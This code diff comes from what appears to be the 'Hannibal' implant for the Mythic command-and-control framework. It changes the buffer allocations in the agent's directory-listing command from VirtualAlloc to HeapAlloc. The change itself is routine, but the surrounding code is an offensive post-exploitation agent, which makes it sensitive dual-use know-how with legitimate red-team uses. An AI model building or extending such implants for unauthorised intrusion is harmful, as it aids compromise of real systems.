@@ -148,7 +148,7 @@ SECTION_CODE void cmd_ls(TASK t)
         
         pic_strcatW(errorMessage, codeBuffer);
 
-        WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
+        WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, 256);
 
         for (int i = 0; i < 256; i++) {
             response_content[i] = errorMessage[i];
@@ -177,7 +177,7 @@ SECTION_CODE void cmd_ls(TASK t)
     int CURRENT_BUFFER_USAGE = 0;
 
     // Freed in mythic_http_post_tasks()
-    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, INITIAL_BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, INITIAL_BUFFER_SIZE);
     response_content[0] = 0;
 
     WCHAR sizeBuffer[20];
@@ -210,7 +210,7 @@ SECTION_CODE void cmd_ls(TASK t)
             int itemLength = pic_strlenW(fileType) + pic_strlenW(timeBuffer) + pic_strlenW(accessBuffer) + pic_strlenW(writeBuffer) + pic_strlenW(ffd.cFileName) + 50;
             if (CURRENT_BUFFER_USAGE + itemLength * sizeof(WCHAR) > CURRENT_BUFFER_SIZE) {
                 int newSize = CURRENT_BUFFER_USAGE + (itemLength * sizeof(WCHAR)) + INITIAL_BUFFER_SIZE;
-                WCHAR *newResponseContent = (WCHAR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, newSize, MEM_COMMIT, PAGE_READWRITE);
+                WCHAR *newResponseContent = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, newSize);
                 if (newResponseContent) {
                     for (int j = 0; j < buff_cursor; j++) {
                         newResponseContent[j] = response_content[j];
